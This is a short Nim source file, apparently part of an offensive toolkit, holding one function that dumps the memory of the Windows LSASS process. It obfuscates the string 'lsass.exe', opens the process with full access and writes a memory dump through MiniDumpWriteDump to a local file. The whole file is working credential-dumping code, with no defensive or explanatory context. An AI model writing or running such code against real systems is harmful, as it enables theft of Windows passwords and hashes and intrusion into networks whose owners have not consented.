import helpers
import winim
import NimProtect

proc MiniDumpWriteDump(
    process_handle: HANDLE,
    ProcessId: DWORD, 
    hFile: HANDLE, 
    DumpType: MINIDUMP_TYPE, 
    ExceptionParam: PMINIDUMP_EXCEPTION_INFORMATION, 
    UserStreamParam: PMINIDUMP_USER_STREAM_INFORMATION,
    CallbackParam: PMINIDUMP_CALLBACK_INFORMATION    
): BOOL {.importc: "MiniDumpWriteDump", dynlib: "dbghelp", stdcall.}


proc dump_lsass_minidumpwritedump*(): bool =
    var is_success = false
    let pid = get_pid(protectString("lsass.exe"))
    if not bool(pid):
        return is_success
    var process_handle = OpenProcess(PROCESS_ALL_ACCESS, false, cast[DWORD](pid))
    if not bool(process_handle):
        return is_success
    try:
        var f = open("l.d", fmWrite)
        var success = MiniDumpWriteDump(
            process_handle,
            cast[DWORD](pid),
            f.getOsFileHandle(),
            0x00000002,
            NULL,
            NULL,
            NULL
        )
        if bool(success):
            is_success = true
        else:
            is_success = false
        f.close()
    finally:
        CloseHandle(process_handle)
        return is_success

